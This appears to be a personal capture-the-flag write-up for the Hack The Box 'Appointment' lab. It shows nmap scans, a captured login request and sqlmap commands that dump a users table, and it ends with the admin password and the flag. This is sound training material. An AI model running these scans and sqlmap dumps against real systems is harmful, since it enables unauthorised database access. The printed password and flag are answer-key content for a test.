# HTB appointment.

IP = 10.129.151.105

└─$ export IP=10.129.151.105

# This is about SQL and SQL injection. Structured Query Language (SQL) is a standard language that is used to execute and manipulate databases.
#

└─$ nmap -p- --min-rate 5000 -sV $IP -oN initial_scan_appointment

sudo nmap -p T:80 -sC -sV -A $IP -oN initial_scan_appointment_2


'''
'''

Target

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Login
|_http-server-header: Apache/2.4.38 (Debian)

# open port is 80 which typically offers the service http. 

# Added the IP together with the port number (10.129.151.105:80) to my broswer and I was brought to a website.
# The next step is to do a SQL injectin.
# SQL injetion usually occurs when you ask a user for input, like their username/userid, and istead of a name/id, the user gives you an SQL statement that will unknowingly run on your database.


POST / HTTP/1.1
Host: 10.129.151.105
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.129.151.105
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.129.151.105/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

username=admin&password=amdim

#The details above has been derived from a burpsuite interception after I entered the usernameand password in the $IP:80.
# The info was copy-pasted to a new file named new.req so using the cmds below I tried to retrieve details about the database.

$ sqlmap -r new.req 

─$ sqlmap -r new.req -D appdb -T users --dump

# appdb is the application that is running -T is the tables which is named users.

─$ sqlmap -r new.req -D appdb -T users -C password --dump

# the password received was 328ufsdhjfu2hfnjsekh3rihjfcn23KDFmfesd239"23m^jdf it really took some time.


# using the username (admin) and password above I was able to retrive the flag which was e3d0796d002a446c0e622226f42e9672.

















